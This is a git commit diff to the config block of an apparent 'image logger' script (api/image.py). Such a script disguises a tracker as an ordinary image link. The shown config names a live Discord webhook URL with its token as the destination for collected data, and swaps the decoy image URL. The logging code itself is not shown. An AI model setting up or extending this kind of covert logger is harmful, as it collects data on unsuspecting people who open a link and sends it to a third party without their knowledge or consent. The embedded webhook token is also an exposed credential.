6f8526511c0df797b18edb907731aad4926ae36b
StarLol726 <star122b@gmail.com>
2025-12-30 13:51:07 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1455537389417136181/72Z1IW17zH6zXVttwzRcZ2fTYSu-O3mdT5KEkba9ahOQxj6A7i2yJN2SMe5Ihlg0Zy10",
-    "image": "https://www.insightplatforms.com/wp-content/uploads/2018/07/tracx_logo.png", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
